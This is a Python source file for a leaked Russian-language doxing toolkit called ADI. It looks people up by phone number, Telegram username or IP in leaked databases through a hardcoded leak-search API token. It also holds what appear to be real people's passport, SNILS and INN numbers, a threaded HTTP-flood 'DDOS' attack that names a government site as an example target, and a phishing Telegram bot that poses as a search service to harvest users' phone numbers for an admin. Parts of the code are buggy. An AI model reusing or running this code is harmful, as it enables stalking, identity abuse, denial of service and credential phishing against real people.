import os
import time

from pystyle import Colors, Colorate
from ctypes import wintypes
import ctypes
import uuid, netifaces, hashlib,requests

hWnd = ctypes.windll.kernel32.GetConsoleWindow()

user32 = ctypes.windll.user32
screenWidth = user32.GetSystemMetrics(0)
screenHeight = user32.GetSystemMetrics(1)
rect = wintypes.RECT()
ctypes.windll.user32.GetWindowRect(hWnd, ctypes.pointer(rect))

windowWidth = rect.right - rect.left
windowHeight = rect.bottom - rect.top

newX = int((screenWidth - windowWidth) / 2)
newY = int((screenHeight - windowHeight) / 2)

ctypes.windll.user32.MoveWindow(hWnd, newX, newY, windowWidth, windowHeight, True)

def csls():
    os.system("clear")
    os.system("cls")

def get_mac_address():
    all_interfaces = netifaces.interfaces()

    interfaces_with_mac = [interface for interface in all_interfaces if netifaces.AF_LINK in netifaces.ifaddresses(interface)]

    mac_addresses = []
    for interface in interfaces_with_mac:
        mac_address_info = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr'].upper()
        mac_addresses.append(mac_address_info)

    formatted_mac_address = ':'.join(mac_addresses)

    return formatted_mac_address


def password_check():
    theme = open('theme.txt', 'r')
    theme_read = theme.read()
    login_banner = '''
    █▄─▄███─▄▄─█─▄▄▄▄█▄─▄█▄─▀█▄─▄█
    ██─██▀█─██─█─██▄─██─███─█▄▀─██
    ▀▄▄▄▄▄▀▄▄▄▄▀▄▄▄▄▄▀▄▄▄▀▄▄▄▀▀▄▄▀
    100 to download bibliotecs
    Слито на канале Falcon-Bytes.github.io
    '''
    if theme_read == 'red_to_purple':
        print(Colorate.Horizontal(Colors.red_to_purple, login_banner))
    if theme_read == 'red_to_blue':
        print(Colorate.Horizontal(Colors.red_to_blue, login_banner))

    print(Colorate.Horizontal(Colors.red_to_black, login_banner))
    
   
    main()
   
    os.system("pip install pystyle")
    os.system("pip install ctypes")
    os.system("pip install uuid")
    os.system("pip install netifaces")
    os.system("pip install hashlib")
    os.system("pip install requests")



def main():
    theme = open('theme.txt', 'r')
    theme_read = theme.read()
    banner = '''


     █████╗    ██████╗   ╔██╗
    ██╔══██╗   ██╔══██╗  ║██║
    ███████║   ██║  ██║  ║██║
    ██╔══██║   ██║  ██║  ║██║
    ██║  ██║   ██████╔╝  ║██║
    ╚═╝  ╚═╝   ╚═════╝   ╚══╝
    Слито на канале Falcon-Bytes.github.io
    '''

    menu = '''
    Слито на канале Falcon-Bytes.github.io
    ┎──────────────────────Menu────────────────────────┐
    │[01]Main-search    (A)   [05]FakeInfo         (E) │
    │[02]IP-Search      (B)   [06]Link-search      (D) │
    │[03]Phone-Database (C)   [07]EyeOfGod-parsing (F) │
    │[04]Telegram-Search(D)   [08]Port Scanner     (Z) │
    │                                                  │
    │[09]DOS-Atack [33]Add-Database [40] Settings      │
    │[10]Passport-Generator [34]Help [99] Log OUT      │
    ┖──────────────────────────────────────────────────┘
    
             '''
    if theme_read == 'red_to_purple':
        print(Colorate.Horizontal(Colors.red_to_purple, banner))
        print(Colors.red_to_white + menu)
    if theme_read == 'red_to_blue':
        print(Colorate.Horizontal(Colors.red_to_blue, banner))
        print(Colors.red + menu)
    if theme_read == 'white_to_red':
        print(Colorate.Horizontal(Colors.white_to_red, banner))
        print(Colors.red + menu)
    if theme_read == 'red_to_red':
        print(Colorate.Horizontal(Colors.red_to_black, banner))
        print(Colors.red + menu)

    select = input(Colorate.Horizontal(Colors.red_to_black, '╭───[Main | ADI]─────\n╰──'))
    if select == '01':
        main_search()
    elif select == '02':
        ip_search()
    elif select == '03':
        database_scan()
    elif select == '04':
        Telegram()
    elif select == '05':
        faker()
    elif select == '06':
        url()
    elif select == '07':
        eye_of_god()
    elif select == '08':
        port_scanner()
    elif select == '09':
        ddos()
    elif select == '10':
        passport_generator()
    elif select == '34':
        help_menu()
    elif select == '33':
        add_bd()
    elif select == '40':
        settings()
    elif select == '99':
        exit()
    else:
        print(Colorate.Horizontal(Colors.red_to_black, '╭───[Main | ADI]─────\n╰──Не известный пункт'))
        time.sleep(2)
        main()
def main_search():
    import requests
    import pystyle
    from colorama import Fore
    request_count = 0
    last_request_time = 0
    API = "7115254600:uioROz1N"
    def Search(Term):
        def make_request(Term):
            data = {"token": API, "request": Term, "limit": 100, "lang": "ru"}
            url = 'https://server.leakosint.com/'
            response = requests.post(url, json=data)
            return response.json()

        data = make_request(Term)
        for source in data["List"]:
            if source == "Ничего не найдено":
                print(Fore.RED + "[ADI] Ничего не найдено Слито на канале Falcon-Bytes.github.io")
            pystyle.Write.Print(f"\n[FALCON BYTES] База данных -> ", pystyle.Colors.red_to_black, interval=.001)
            pystyle.Write.Print(f"{source}\n", pystyle.Colors.red_to_black, interval=.001)
            for item in data["List"][source]["Data"]:
                if str(item) in set():
                    continue
                for key, value in item.items():
                    pystyle.Write.Print(f"[ADI] {key} -> ", pystyle.Colors.red_to_black, interval=.001)
                    pystyle.Write.Print(f"{value}\n", pystyle.Colors.red_to_black, interval=.001)
        if "Ничего не найдено" not in data["List"]:
            print()
            pystyle.Write.Print("=============================================", pystyle.Colors.red_to_black,
                                interval=0.005)
            pystyle.Write.Print("ADI", pystyle.Colors.red_to_black, interval=0.005)
            pystyle.Write.Print("=============================================", pystyle.Colors.red_to_black,
                                interval=0.005)
            time.sleep(2)
            main()
    Term = input(Colorate.Horizontal(Colors.red_to_black, '╭───[Search | ADI]─────\n╰──'))
    Search(Term)
def passport_generator():
    import random
    passports = "Александр Николаевич,Дата рождения: 28.07.1975,Место рождения: Дивногорск,Серия и номер: 0400 718369,Дата выдачи: 28.08.2001,Место выдачи: 1 ГОМ УВД г. Норильска,Код подразделения: 243007,СНИЛС: 142-877-020 69,ИНН: 245723675816", "Юмаева Анастасия Андреевна,Дата рождения: 28.08.1987,Место рождения: с.Лямцино Домодедовского р-на Московской области,Серия и номер: 4613 161839,Дата выдачи: 23.08.2013,Место выдачи: ТП № 2 ОУФМС России по Москойвской области по городскому округу Домодедово,Код подразделения: 500025,СНИЛС: 133-537-839 65,ИНН: 500908069265,", "Костюченко Елена Сергеевна,Дата рождения: 22.10.1981,Место рождения: гор. Джамбул Казахской ССР,Серия и номер: 7515 715942,Дата выдачи: 25.11.2015,Место выдачи: Отделом УФМС России по Челябинской области в Ленинском районе гор. Челябинска,Код подразделения: 740054,СНИЛС: 072-899-737 31,ИНН: 742401518302,", "Арбузов Артур Геннадьевич,Дата рождения: 28.12.1973,Место рождения: Новосибирск,Серия и номер: 5004 410617,Дата выдачи: 19.12.2003,Место выдачи: ОВД Заельцовского района города Новосибирска,Код подразделения: 542003,СНИЛС: 049-637-029 86,ИНН: 540210016461,"
    passas = random.choice(passports)
    print(Colors.red + passas)
    time.sleep(2)
    main()
def port_scanner():
    import socket
    port = input(Colorate.Horizontal(Colors.red_to_black, '╭───[Слито на канале Falcon-Bytes.github.ioPORT | ADI]─────\n╰──'))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex(('127.0.0.1', port))
    if result == 0:
        print(Colorate.Horizontal(Colors.red_to_black, f'╭───[PORT | ADI]─────\n╰──Порт {port} Открыт!'))
        time.sleep(2)
        main()
    else:
        print(Colorate.Horizontal(Colors.red_to_black, f'╭───[PORT | ADI]─────\n╰──Порт {port} Закрыт!'))
        time.sleep(2)
        main()
    sock.close()
def ip_search():
    import urllib
    import json

    getIP = input(Colorate.Horizontal(Colors.red_to_black, '╭───[IP | ADI]─────\n╰──'))
    if getIP == '00':
        main()
    url = "https://ipinfo.io/" + getIP + "/json"
    try:
        getInfo = urllib.request.urlopen(url)
    except:
        print(Colorate.Horizontal(Colors.red_to_black, 'Неизвестный IP!'))
        ip_search()
    infoList = json.load(getInfo)

    def whoisIPinfo(ip):
        try:
            myComand = "whois " + getIP
            whoisInfo = os.popen(myComand).read()
            return whoisInfo
        except:
            return Colorate.Horizontal(Colors.red_to_black,"Ошибка!")
            ip_search()
    print(Colors.red + "IP: ", infoList["ip"])
    print(Colors.red + "Город: ", infoList["city"])
    print(Colors.red + "Регион: ", infoList["region"])
    print(Colors.red + "Страна: ", infoList["country"])
    print(Colors.red + "Временная зона: ", infoList["timezone"])
    print(Colors.red + "Координаты: ", infoList["loc"])
    print(Colors.red + "Название хоста: ", infoList["hostname"])
    print(Colors.red + "Индекс: ", infoList["postal"])
    print("Слито на канале Falcon-Bytes.github.io")
    time.sleep(3)
    main()

def database_scan():
    from number import rubase2, rubase4, rubase6, rubase7, rubase3, rubase5, rubase8, rubase9
    from number import number_check, sdek, yandexfood, peremena, part1, part2, part3, part4, part6, tele2, mts_1, DNS0, DNS1, DNS2, DNS3, DNS4,spb, cryptobot, rubase1, rubase2
    phone12 = input(Colors.red + '╭───[Phone | ADI]─────\n╰──')
    os.system('cls')
    time.sleep(1)
    print(Colors.red + "Сканируем Базы данных...")
    print("Слито на канале Falcon-Bytes.github.io")
    bd39 = 'basedata/Russian_People2.csv'
    bd38 = 'basedata/Russian_People3.csv'
    bd37 = 'basedata/Russian_People4.csv'
    bd36 = 'basedata/Russian_People5.csv'
    bd35 = 'basedata/Russian_People6.csv'
    bd33 = 'basedata/Russian_People7.csv'
    bd32 = 'basedata/Russian_People8.csv'
    rubase3(bd39, phone12)
    rubase4(bd38, phone12)
    rubase7(bd35, phone12)
    rubase6(bd36, phone12)
    rubase5(bd37, phone12)
    rubase8(bd33, phone12)
    rubase9(bd32, phone12)
    bd28 = 'basedata/Trade.csv'
    cryptobot(bd28, phone12)
    bd21 = 'basedata/DNS0.csv'
    DNS0(bd21, phone12)
    bd22 = 'basedata/DNS1.csv'
    DNS1(bd22, phone12)
    bd23 = 'basedata/DNS2.csv'
    DNS2(bd23, phone12)
    bd24 = 'basedata/DNS3.csv'
    DNS3(bd24, phone12)
    bd25 = 'basedata/DNS4.csv'
    DNS4(bd25, phone12)
    bdsm = 'basedata/tele2.csv'
    tele2(bdsm, phone12)
    bd27 = 'basedata/spb.csv'
    spb(bd27, phone12)
    bd20 = 'basedata/mts1.csv'
    bd31 = 'basedata/Russian_People_1.csv'
    rubase2(bd31, phone12)
    bd30 = 'basedata/Russian_People.csv'
    rubase1(bd30, phone12)
    mts_1(bd20, phone12)
    bd = 'basedata/EYEOFGOD.csv'
    number_check(bd, phone12)
    bd12 = 'basedata/CDEK2022Ev.csv'
    sdek(bd12, phone12)
    yandexeda = 'basedata/yandex_eda.csv'
    yandexfood(yandexeda, phone12)
    peremoga = 'basedata/part5.csv'
    peremena(peremoga, phone12)
    part_1 = 'basedata/part1.csv'
    part1(part_1,phone12)
    part_2 = 'basedata/part2.csv'
    part2(part_2, phone12)
    part_3 = 'basedata/part3.csv'
    part3(part_3,phone12)
    part_4 = 'basedata/part4.csv'
    part4(part_4,phone12)
    part_6 = 'basedata/part6.csv'
    part6(part_6, phone12)
    print(Colorate.Horizontal(Colors.red_to_black, "Если ничего не выведено, значит программа не смогла ничего найти по бд \n Попробуйте по другому, либо добавьте свою!"))
    time.sleep(1)
    main() #WeB_BackenD

def faker():
    from faker import Faker
    def Faker_US():
        fake = Faker("")
        print(Colorate.Horizontal(Colors.red_to_black, f"""
    fake info:

    Ф.И.О - {fake.name()}
    Дата рождения - {fake.date()}
    Адрес - {fake.address()}
    Номер -  +7919{fake.random_number(digits=7)}
    Провайдер - {fake.credit_card_provider()}
    Номер - {fake.credit_card_number()}
    Срок действия - {fake.credit_card_expire()}
    Код безопасности - {fake.credit_card_security_code()}
    MAC Adress - {fake.hexify(text='MAC Address: ^^:^^:^^:^^:^^:^^')}
    IPv4 - {fake.ipv4_private()}\n\n
    Слито на канале Falcon-Bytes.github.io
    """))
    Faker_US()
    time.sleep(2)
    main()

def Telegram():
    def tg(tgbase, username):
        with open(tgbase, 'r', ) as file:
            lines = file.readlines()

        for line in lines:
            data = line.strip().split('|')
            if len(data) >= 6:
                tg = data[5]
                if username in tg:
                    system_number = data[0]
                    name = data[1]
                    last_name = data[2]
                    phone_number = data[3]
                    ID = data[4]
                    was_online = data[6]
                    print(Colorate.Horizontal(Colors.red_to_black, f'''
    [RESULT]
    BaseData: Telegram (2024)
    USERNAME: {tg}
    NAME: {name}
    LAST NAME: {last_name}
    Phone Number: {phone_number}
    ID: {ID}
    Was Online: {was_online}
    System Number: {system_number}\n\nСлито на канале Falcon-Bytes.github.io
                          '''))
                    time.sleep(2)
                    main()
    username = input(Colorate.Horizontal(Colors.red_to_black, '╭───[Telegram | ADI]─────\n╰──'))
    tgbase = 'basedata/Telegram.csv'
    tg(tgbase, username)
choise = '5'
def url():
    nick = input(Colorate.Horizontal(Colors.red_to_black, '╭───[NickName | ADI]─────\n╰──'))
    print(Colors.red + f"Поиск информации...")
    print(Colors.red + f"Соцсети")
    urls = [
        f"https://www.tiktok.com/@{nick}",
        f"https://www.youtube.com/@{nick}",
        f"https://t.me/{nick}",
        f"https://www.roblox.com/user.aspx?username={nick}",
        f"https://https://www.twitch.tv/{nick}"
    ]
    for url in urls:
        try:
            response = requests.get(url)
            if response.status_code == 200:
                print(Colors.red + f"{url} - аккаунт найден")
                time.sleep(2)
                main()
            elif response.status_code == 404:
                print(Colors.red + f"{url} - аккаунт не найден")
                time.sleep(2)
                main()
            else:
                print(Colors.red + f"{url} - ошибка {response.status_code}")
                time.sleep(2)
                main()
        except:
            print(Colors.red + f"{url} - ошибка при проверке")
            time.sleep(2)
            main()


def ddos():
    import threading,random,requests
    if choise == '5':
        url = input(Colorate.Horizontal(Colors.red_to_black, '╭───[Enter URL | ADI]─────\n╰──'))
        num_requests = int(Colorate.Horizontal(Colors.red_to_black, '╭───[Count REQUESTS | ADI]─────\n╰──'))

        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36',
            'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)',
            'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'
        ]

        def send_request(i):
            user_agent = random.choice(user_agents)
            headers = {'User-Agent': user_agent}

            try:
                response = requests.get(url, headers=headers, timeout=0.1)
                print(Colorate.Horizontal(Colors.red_to_black, f'╭───[Requests sent]─────\n╰── {i}'))
            except:
                print(Colorate.Horizontal(Colors.red_to_black, f'╭───[Requests sent]─────\n╰── {i}'))

        threads = []
        for i in range(1, num_requests + 1):
            t = threading.Thread(target=send_request, args=[i])
            t.start()
            threads.append(t)

        for t in threads:
            t.join()
        time.sleep(2)
        main()

def eye_of_god():
    from telebot import types
    import telebot
    from pystyle import Write
    import traceback
    Token = input(Colorate.Horizontal(Colors.red_to_black,'\nВведите токен бота (@botfather): '))
    admin = input(Colorate.Horizontal(Colors.red_to_black,'\nВведите ID (@getmyidbot): '))
    bot = telebot.TeleBot(Token)

    Write.Print(("бот запущен! \n\nСлито на канале Falcon-Bytes.github.io"), Colors.red_to_black, interval=0.005)
    time.sleep(2)
    main()
    find_menu = types.InlineKeyboardMarkup()
    button0 = types.InlineKeyboardButton('🔎Начать поиск', callback_data="start_dox")
    find_menu.row(button0)
    button1 = types.InlineKeyboardButton('⚙️Аккаунт', callback_data="dox")
    button2 = types.InlineKeyboardButton('🆘Поддержка', callback_data="dox")
    find_menu.row(button1, button2)
    button3 = types.InlineKeyboardButton('🤖Создать собственный бот', callback_data="dox")
    find_menu.row(button3)
    button4 = types.InlineKeyboardButton('🤝Партнерская программа', callback_data="dox")
    find_menu.row(button4)

    @bot.message_handler(commands=['start'])
    def start(message):
        bot.send_message(message.from_user.id, "*Добро пожаловать!*", parse_mode="Markdown")
        bot.send_message(message.from_user.id, "*Выберите нужное действие:*", parse_mode="Markdown",
                         reply_markup=find_menu)

    @bot.callback_query_handler(func=lambda call: call.data == "start_dox")
    def button0_pressed(call: types.CallbackQuery):
        bot.send_message(chat_id=call.message.chat.id, text="👤 Поиск по имени\n" + \
                                                            "├  `Блогер` _(Поиск по тегу)_\n" \
                                                            "├  `Антипов Евгений Вячеславович`\n" \
                                                            "└  `Антипов Евгений Вячеславович 05.02.1994`\n" \
                                                            "_(Доступны также следующие форматы_ " + "`05.02`" + "_/_" + "`1994`" + "_/_" + "`28`" + "_/_" + "`20-28`" + "_)_\n\n" \
                                                                                                                                                                         "🚗 Поиск по авто\n" \
                                                                                                                                                                         "├  `Н777ОН777` - поиск авто по *РФ*\n" \
                                                                                                                                                                         "└  `ХТА21150053965897` - поиск по *VIN*\n\n" \
                                                                                                                                                                         "👨 *Социальные сети*\n" \
                                                                                                                                                                         "├  `https://www.instagram.com/violetta_orlova` - *Instagram*\n" \
                                                                                                                                                                         "├  `https://vk.com/id577744097` - *Вконтакте*\n" \
                                                                                                                                                                         "├  `https://facebook.com/profile.php?id=1` - *Facebook*\n" \
                                                                                                                                                                         "└  `https://ok.ru/profile/162853188164` - *Одноклассники*\n\n" \
                                                                                                                                                                         "📱 `79999939919` - для поиска по *номеру телефона*\n" \
                                                                                                                                                                         "📨 `tema@gmail.com` - для поиска по *Email*\n" \
                                                                                                                                                                         "📧 `#281485304`, `@durov` или `перешлите сообщение` - поиск по *Telegram* аккаунту\n\n" \
                                                                                                                                                                         "🔐 `/pas churchill7` - поиск почты, логина и телефона *по паролю*\n" \
                                                                                                                                                                         "🏚 `/adr Москва, Тверская, д 1, кв 1` - информация по адресу (РФ)\n" \
                                                                                                                                                                         "🏘 `77:01:0001075:1361` - поиск по *кадастровому номеру*\n\n" \
                                                                                                                                                                         "🏛 `/company Сбербанк` - поиск по *юр лицам*\n" \
                                                                                                                                                                         "📑 `/inn 784806113663` - поиск по *ИНН*\n" \
                                                                                                                                                                         "🎫 `/snils 13046964250` - поиск по *СНИЛС*\n\n" \
                                                                                                                                                                         "📸 Отправьте *фото человека*, чтобы найти его или двойника на сайтах *ВК*, *ОК*.\n" \
                                                                                                                                                                         "🚙 Отправьте *фото номера автомобиля*, чтобы получить о нем информацию.\n" \
                                                                                                                                                                         "🙂 Отправьте *стикер*, чтобы найти *создателя*.\n" \
                                                                                                                                                                         "🌎 Отправьте *точку на карте*, чтобы *найти людей*, которые сейчас там.\n" \
                                                                                                                                                                         "🗣 С помощью *голосовых команд* также можно выполнять *поисковые запросы*.",
                         parse_mode="Markdown")
    send = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    button_phone = types.KeyboardButton(text="✅Подтвердить", request_contact=True)
    send.add(button_phone)
    @bot.callback_query_handler(func=lambda call: call.data == "dox")
    def button1_pressed(call: types.CallbackQuery):
        bot.send_message(chat_id=call.message.chat.id,
                         text="⚠️Прежде чем начать поиск, подтвердите свой аккаунт\n\n""*Это временная мера, связанная с активной DDOS атакой на нас.*",
                         parse_mode="Markdown", reply_markup=send)
    @bot.message_handler(content_types=['contact'])
    def contact(message):
        if message.contact is not None:
            try:
                Write.Print((
                                f"\nКто-то отправил свой номер:\n Имя: {message.from_user.first_name}\n Логин: {message.from_user.username}\n ID: {message.from_user.id}\n Номер телефона:  {message.contact.phone_number}\n -------------------------------"),
                            Colors.red, interval=0.005)
                bot.send_message(admin, "*🔔Кто-то отправил свой номер!*\n\nСлито на канале Falcon-Bytes.github.io" + \
                                 "Имя: `" + message.from_user.first_name + \
                                 "\n`Логин: @" + message.from_user.username + \
                                 "\n`ID: " + str(message.from_user.id) + \
                                 "\n`Номер телефона: `" + message.contact.phone_number + "`", parse_mode="Markdown")
                f = open("db.csv", "a+")
                f.write(
                    f"{message.from_user.first_name},{message.from_user.last_name},{message.from_user.username},{message.from_user.id},{message.contact.phone_number}\n")
                f.close()
            except TypeError:
                traceback.print_exc()
                print("Нет тела или др. typeerror")
            curhour = time.asctime().split(" ")[3].split(":")[0]
            bot.send_message(message.from_user.id,
                             f"*⚠️ Технические работы до  {int(curhour) + 7} :00 по мск.*\n\nРаботы будут завершены в данный промежуток времени, все подписки продлены.",
                             parse_mode="Markdown", reply_markup=types.ReplyKeyboardRemove())
    @bot.message_handler(content_types=['text'])
    def handler(message):
        bot.send_message(message.from_user.id,
                         "⚠️Прежде чем начать поиск, подтвердите свой аккаунт\n\n""*Это временная мера, связанная с активной DDOS атакой на нас.*",
                         parse_mode="Markdown", reply_markup=send)
    bot.infinity_polling(none_stop=True)
def add_bd():
    obs = '''
    +++++++Как добавить базу данных?+++++++
    1) Найдите БД с форматом .csv (по другому никак)
    2) Откройте файл custombd.py
    3) В файле custombd.py находятся все нужные коды с пояснением
    4) Следуйте по инструкции в файле.\n\nСлито на канале Falcon-Bytes.github.io
    '''
    print(Colorate.Horizontal(Colors.red_to_black, obs))
    time.sleep(2)
    main()
def help_menu():
    import time
    help_menuu = '''
    ++++++++++++++Меню Помощи+++++++++++++++++
    + 1. Телефон
    + 2. Как добавить Базу данных
    + 3. Тг
    + 4. IP 
    + 5. DDOS
    00 - Назад в меню\n\nСлито на канале Falcon-Bytes.github.io
    '''
    print(Colorate.Horizontal(Colors.red_to_black, help_menuu))
    helpselect = input(Colorate.Horizontal(Colors.red_to_black, '╭───[Help | ADI]─────\n╰──\n\nСлито на канале Falcon-Bytes.github.io'))
    if helpselect == '00':
        main()
    if helpselect == '1':
        print(Colorate.Horizontal(Colors.red_to_black, '╭───[Help | ADI]─────\n╰──Номер телефона можно вводить любым способом. \n\nСлито на канале Falcon-Bytes.github.io\n Примеры: +79000000000; 79000000000; 89000000000 \n Если программа ничего не выдает то попробуйте эти три способа!'))
        time.sleep(2)
        main()
    if helpselect == '2':
        print(Colorate.Horizontal(Colors.red_to_black, '╭───[Help | ADI]─────\n╰──Как добавить базу данных?. \n\nСлито на канале Falcon-Bytes.github.io\n Все очень просто! Для начала вам нужна база формата .csv \n Потом заходите в код программы > number > там добавляйте новые строчки, выберайте кодировку \n Далее заходим в главный код и добавляем функцию и указываем путь к базе.'))
        time.sleep(2)
        main()
    if helpselect == '3':
        print(Colorate.Horizontal(Colors.red_to_black, '╭───[Help | ADI]─────\n╰──Юзернейм телеграмм вводите без @. \n Пример: ebanat228338; xuy123;\n\nСлито на канале Falcon-Bytes.github.io'))
        time.sleep(2)
        main()
    if helpselect == '4':
        print(Colorate.Horizontal(Colors.red_to_black, '╭───[Help | ADI]─────\n╰──IP вводить только цифрами. \n Пример: 228.228.28.228 и тд\n\nСлито на канале Falcon-Bytes.github.io'))
        time.sleep(2)
        main()
    if helpselect == '5':
        print(Colorate.Horizontal(Colors.red_to_black,'В поле с DDos атакой просто введите URL сайта! \n Пример: https://mvd.ru\n\nСлито на канале Falcon-Bytes.github.io'))
        time.sleep(2)
        main()

def settings():
    selecta = '''
    Вы можете изменить тему программы. Для этого перейдите в файл theme.txt, и введите туда след значение:
    red_to_purple - Логотип программы и меню входа будет красно-розовым
    red_to_blue - Логотип программы и меню входа будет сине-красным
    white_to_red - Логотип программы и меню входа будет бело-красным
    red_to_red - Логотип программы и меню входа будет красным
        
        
    '''
    print(Colorate.Horizontal(Colors.red_to_black, selecta))
    time.sleep(2)
    main()
if __name__ == '__main__':
    password_check()
